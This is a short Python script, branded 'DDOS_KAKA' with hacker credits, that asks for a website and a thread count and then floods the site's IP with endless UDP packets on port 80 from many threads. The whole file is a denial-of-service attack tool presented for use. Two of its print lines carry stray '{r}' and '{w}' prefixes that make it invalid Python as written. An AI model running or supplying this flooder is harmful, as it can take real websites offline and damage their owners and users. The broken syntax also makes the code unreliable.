import time
import socket
import sys
import _thread
r='\033[1;31m'
g='\033[32;1m' 
y='\033[1;33m'
w='\033[1;37m'
b='\033[1;34m'
p='\033[1;35m'
{r} print("###### DDOS_KAKA ######")
{w} print("soroush : @hacka")
print("<=# hackeran kolah sefid #=>")
print("<=# hacker samy #=>")
print("<=#     ddos_kaka #=>")
print("<=# # ddos_kaka #=>")
print("<=# # hacker samy# #=>")
print("##<<<+hacker samy+>>>##")
site = input("Enter your site url => ")
thread_count = input("Enter your thread => ")
ip = socket.gethostbyname(site)
UDP_PORT = 80
MESSAGE = 'virus32'
print("UDP target IP:", ip)
print("UDP target port:", UDP_PORT)
time.sleep(3)
def ddos(i):
    while 1:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
        print("<=DDOS_KAKA hacker samy package sent=>")
for i in range(int(thread_count)):
    try:
        _thread.start_new_thread(ddos, ("Thread-" + str(i),))
    except KeyboardInterrupt:
        sys.exit(0)
while 1:
    pass
